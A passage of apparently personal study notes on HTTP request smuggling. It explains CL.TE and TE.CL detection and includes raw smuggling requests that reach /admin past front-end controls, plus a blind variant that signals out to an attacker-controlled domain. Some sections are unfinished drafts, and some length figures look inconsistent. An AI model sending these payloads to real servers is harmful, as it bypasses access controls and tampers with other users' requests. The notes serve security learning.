Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling

```

If the attack works, the subsequent request will be merged with the smuggled request, such that the back-end receives an invalid HTTP request (in this example, `404` response), proving interference from the attack.

Here is how it works under the hood:

1. **Attack request**
	1. *Front-end server processing (`Content-Length`):*
		1. Interprets `Content-Length: 49` as length of the body.
		2. Reads `49` bytes after the headers, ignores chunked encoding.
		3. Forwards all `49` bytes to the back-end as a single request.
	2. *Back-end server processing (`Transfer-Encoding`):*
		1. Uses the `Transfer-Encoding` header to parse the request as chunked.
		2. Reads the first chunk size (`e` in hexadecimal is `14` in decimal), then reads 14 bytes (`q=smuggling&x=\r\r`).
		3. Encounters `0\r\n`, which signals end of chunks, and then another `\r\n`, which signals the end of the request body.
		4. The `GET /404 HTTP/1.1` and everything after is interpreted as the next request int he TCP stream.

2. **Normal request**
	1. *Front-end server processing (`Content-Length`):*
		1. Reads the next request on a different TCP connection.
		2. Puts that request onto the **same TCP connection** with the proxy as the previous (attack) request.
	2. *Back-end server processing (`Transfer-Encoding`):*
		1. Reads the next request starting with the smuggled `GET /404 HTTP/1.1`.
		2. Interprets the normal request as part of the smuggled one, and therefore responds with `404 Not Found` page to the normal request.

```HTTP
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

>[!important] 
>The *attack* request and the *normal* request should be sent to the server using different network connections. Sending both requests through the same connection won't prove that the vulnerability exists.

>[!note]+ Requests should reach the same back-end server
>Since you need the *attack* and *normal* request to be forwarded to the same back-end server, the requests should be as much similar to each other as possible, e.g., using the same `POST` parameters, URLs, etc. This will increase the changes the front-end will forward those requests to the same back-end server.

>[!note]+ Load-balancers
>If the proxy is a load-balancer, your requests will be sent to different back-end servers, and the confirmation will fail. Try several times.

>[!note]+ Accidental attacks of other users
>If your attack request manages to interfere with a subsequent request, but this wasn't the *normal* you sent to detect the interference, it means that another application user was affected by your attack. If you keep doing, it might be a bit disruptive to other users, so it's best to be careful.
#### TE.CL

To confirm a TE.CL vulnerability, you can send a request like this twice:

```HTTP
POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0
```

If the server is vulnerable to TE.CL HRS, you will get an `404` error in response to the second request.

## Exploiting HTTP request smuggling

### Bypassing front-end security controls

The front-end server may enforce access controls based on URLs the client is trying to access. For example, it may forward only authorized requests to the back-end, and drop all other requests. The back-end server then honors every request the front-end forwarded and processes it accordingly without additional security checks.

HTTP request smuggling can bypass such protection:

- Smuggler request:

```HTTP
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: example.com
Foo: x
```

## Blind request smuggling

Sometimes you may encounter a system you're sure it's vulnerable (say, a timing detection technique works there), but it's traffic volume is so high that it's almost impossible to poison your own request and receive a poisoned response yourself. How can you prove the system is really vulnerable in this case?

One of the ways to confirm such vulnerability is to append a unique hostname you control to the `X-Forwarded-For` header of the smuggled request, such as:

```HTTP
POST / HTTP/1.1
Host: example.com
Content-Length: 200
Transfer-Encoding: chunked
0

GET / HTTP/1.1
Host: example.com
X-Forwarded-For: xyz.your-controlled-domain.com
X: X<poisoned reqest goes here...>
```

If you detect a DNS lookup for that hostname this proves that the back-end interpreted your request as two separate ones and tried to process it, i.e., the system is vulnerable.

## Payload cheat sheet

### CL.TE


### TE.CL

### TE.TE

# drafts

## HTTP/2 request smuggling

HTTP/2 represents a paradigm shift. It was designed to overcome HTTP/1.1’s limitations, particularly **head-of-line blocking due to pipelining** and inefficient TCP connection usage.

Key points:
- **Binary framing layer**
	- Unlike HTTP/1.x’s plain text protocol, HTTP/2 splits communications into *framed binary messages*.
    
- **Multiplexing**
	- Most importantly, HTTP/2 allows **multiple streams (requests/responses) concurrently over a single TCP connection**. Frames carry information about the stream there're related to, and therefore frames from multiple streams can be interleaved.

For more information on HTTP/2, see [[྾_how_HTTP2_works|྾_how_HTTP/2_works]].

>[!note] Because of this multiplexing feature, **connection reuse is baked in and mandatory**.




![[detect_hrs.png]]


### Burp Suite setup

>1. **Downgrade HTTP/2 to HTTP/1.1**

To specify Burp Repeater to use HTTP/1.1 instead of HTTP/2, go to `Inspector > Request attributes > HTTP/1`:

![[http_1.png]]

>2. **Change request method to `POST`**

To change request method from `GET` to `POST`:

![[change_request_method.png]]

>2. **Disable automatic update of the `Content-Length` header in Burp Repeater**

To disable automatic update of the `Content-Length` header:

![[disable_content-length_update.png]]

>2. **Show non-printable characters**

To show non-printable characters:

![[show_nonprintable_characters.png]]


## testing for HRS

tools:

- [`Smuggler`](https://github.com/defparam/smuggler)
- [`simple-http-smuggler-generator`](https://github.com/dhmosfunk/simple-http-smuggler-generator)

## real-world scenarios

- https://infosecwriteups.com/finding-my-first-bug-http-request-smuggling-5fdc89581fe2
- https://medium.com/@StealthyBugs/http-request-smuggling-on-business-apple-com-and-others-2c43e81bcc52
- https://hackerone.com/reports/955170
## resources

it is much more interesting to imagine requests as people that cross a border with some country on a track or van, when one of them is prohibited to cross the border or just lost their passport. a front-end server is a border checkpoint, the destination is a back-end server. the goal is to mislead border guards that there is only one person in a van. 


- https://community.f5.com/kb/technicalarticles/http-request-smuggling-what-it-is-how-to-find-it-and-how-to-stop-it/312537
- https://0xn3va.gitbook.io/cheat-sheets/web-application/http-request-smuggling
- https://gowthams.gitbook.io/bughunter-handbook/intresting-vulnerabilities/http-desync-attacks

- https://cel1s0.gitbook.io/offsec-notes/portswigger-academy/advanced-topics/http-request-smuggling
- https://portswigger.net/web-security/request-smuggling
- https://portswigger.net/web-security/request-smuggling/finding

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling
- https://s0cm0nkey.gitbook.io/s0cm0nkeys-security-reference-guide/red-offensive/exploitation-and-targets/attacks-and-vulnerabilities/http-request-smuggling


- https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
- https://portswigger.net/research/http2
- https://portswigger.net/research/browser-powered-desync-attacks
- https://portswigger.net/research/http-3-connection-contamination
- https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning


### HTTP connection coalescing

>**HTTP connection coalescing** refers to the practice where an intermediary server, such as a reverse proxy or load balancer, **reuses a single TCP connection to the back-end application server to carry multiple HTTP requests sequentially**.

 Instead of opening a new TCP connection for each client request, these intermediary devices pool sockets (TCP connections) and send many requests through the same connection.

>[!note] 
>Reverse proxies maintain pools of TCP sockets to back-end servers. When a client request comes in, the proxy forwards it on an _already open_ back-end connection, avoiding TCP handshakes for each request.

Coalescing is crucial for performance because, as mentioned, TCP connection establishment and teardown impose significant latency and resource overhead.

But what this means for HTTP request smuggling is that **multiple HTTP requests from different clients are sent one after another down the same TCP connection between proxy and back-end**. So, the back-end server receives a stream of concatenated HTTP requests, and the only way to separate them somehow is to use `Content-Length` or `Transfer-Encoding` headers in the requests.

>[!note]
>Some proxies buffer entire client requests before sending them to the back-end, while others stream the data as it arrives. Buffering behavior affects how the back-end interprets the byte stream, especially under conditions where pipelining or chunked transfer encoding is used.
>This sometimes may contribute to smuggling opportunities.


### How HTTP request smuggling works

Let's consider an example.

Suppose a front-end server doesn't support the `Transfer-Encoding` header, but the back-end does. The attacker sends the following request:

```HTTP
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Transfer-Encoding: chunked

9␍␊
chunk one␍␊
0␍␊
␍␊
GET /admin HTTP/1.1␍␊
Junk: x
```

- The **front-end server** ignores the unsupported `Transfer-Encoding` header, and uses the `Content-Length` header to determine the length of the request. As a result, the front-end server reads exactly `53` bytes after the headers — everything up to the end of the last `Junk: x` — and forwards the request **as one** to the back-end.

>[!important] Each CRLF `\r\n` is two bytes.
>See [[྾_CRLF_injection]]

>[!important] In HTTP, the **newline (CRLF) that separates the headers from the body is NOT part of the body** and is NOT counted in the Content-Length value.
>The Content-Length header counts only the bytes in the message body itself, starting immediately after that empty CRLF line.

- The **back-end server**, however, fully supports the `Transfer-Encoding` header, and therefore starts interpreting the request body as chunked data, ignoring `Content-Length`. It reads the first chunk (`9` bytes long), and then encounters the **zero chunk** and a newline which signifies the end of the request. For the front-end server, everything that comes after the last `0` **is considered a completely new request**. Notice there's not CRLF after the junk header. 

- The request the back-end server receives right after **is considered the continuation of the request the server already started interpreting**. It looks like this:

```HTTP
GET /admin HTTP/1.1␍␊
Junk: xGET /normal_page HTTP/1.1␍␊
Host: example.com␍␊
```

Now what if the front-end server is configured to block any requests to `/admin` coming from external networks? This attack completely bypasses it: for the front-end server, that `GET /admin HTTP/1.1` was just a part of a request body of another request, so **it's completely unaware of it**. The back-end simply relies on front-end verification and therefore accepts any requests forwarded from it. 

*The second request was **smuggled** in the first one.*

This is how the violation of the Zero Trust and Defense in Depth principles (the back-end blindly trusts requests from the front-end), along with a slight front-end server misconfiguration, leads to filtering bypasses.

>[!note] This misalignment lets attackers bypass security controls, poison caches, hijack user sessions, or perform other malicious actions that would otherwise be blocked.

For clarification, let's look at how each server perceives the requests.

>**The front-end server perspective:**

- The first request:

```HTTP
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Transfer-Encoding: chunked

9␍␊
chunk one␍␊
0␍␊
␍␊
GET /admin HTTP/1.1␍␊
Junk: x
```

- The second request sent from another user:

```HTTP
GET /normal_page HTTP/1.1␍␊
Host: example.com␍␊
```

>**The back-end server perspective:**

- The first request:

```HTTP
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Transfer-Encoding: chunked

9␍␊
chunk one␍␊
0␍␊
␍␊
```

- The second request from another user:

```HTTP
GET /admin HTTP/1.1␍␊
Junk: xGET /normal_page HTTP/1.1␍␊
Host: example.com␍␊
```

Chances are, the junk header will be ignored. The attacker, in fact, **altered the request of a completely different user**.


>[!important] The essence of HTTP request smuggling is that you can set up a prefix on the back-end that will be applied to the next request that hits the back-end, whether that request is sent by you or somebody else.

### CL.TE (`Content-Length.Transfer-Encoding`)


> [!example]+
> 
> Below is a more realistic example on how HRS can be exploited to smuggle a request to a restricted endpoint and bypass front-end security controls:
> 
> ```HTTP
> POST / HTTP/1.1
> Host: example.com
> Content-Length: 51
> Transfer-Encoding: chunked
> 
> 0␍␊
> ␍␊
> GET /admin HTTP/1.1␍␊
> Host: example.com␍␊
> ␍␊
> ```
> 
> The front-end server doesn't see the second request, a `GET` to `/admin`, and forwards it to the back-end. As a result, the attacker gets access to the admin's panel, all behind the front-end server's back.

>[!tip]+ How to construct?
> 4. Choose the request you want to smuggle:
> 
> ```HTTP
> GET /admin HTTP/1.1␍␊
> Host: example.com␍␊
> ```
> 
> 5. Choose an application endpoint where you can send `POST` requests, such as `/`:
> 
> ```HTTP
> POST / HTTP/1.1
> Host: example.com
> Content-Length: X
> 
> BODY␍␊
>␍␊ 
> ```
> 
> 6. Set the request you want to smuggle as the body of the smuggler `POST` request:
> 
> ```HTTP
> POST / HTTP/1.1
> Host: example.com
> Content-Length: X
> 
> GET /admin HTTP/1.1␍␊
> Host: example.com␍␊
> ␍␊
> ```
> 
> 7. Add a zero chunk in the body before the request being smuggled, and add the `Transfer-Encoding: chunked` header to the `POST` request:
> 
> ```HTTP
> POST / HTTP/1.1
> Host: example.com
> Content-Length: X
> Transfer-Encoding: chunked
> 
> 0␍␊
> ␍␊
> GET /admin HTTP/1.1␍␊
> Host: example.com␍␊
> ␍␊
> ```
> 
>Make sure all necessary CRLF (Carriage Return, Line Feed) characters are set.
> 
> 8. Calculate the length of the full body of the smuggler request (in decimal) and set it as a value of the `Content-Length` header.
> 
> ```HTTP
> POST / HTTP/1.1
> Host: example.com
> Content-Length: 51
> Transfer-Encoding: chunked
>
> 0␍␊
> ␍␊
> GET /admin HTTP/1.1␍␊
> Host: example.com␍␊
> ␍␊
> ```
> - The CRLF (`2` bytes) between the headers and body is not included in the body length. All other CRLF sequences are counted.

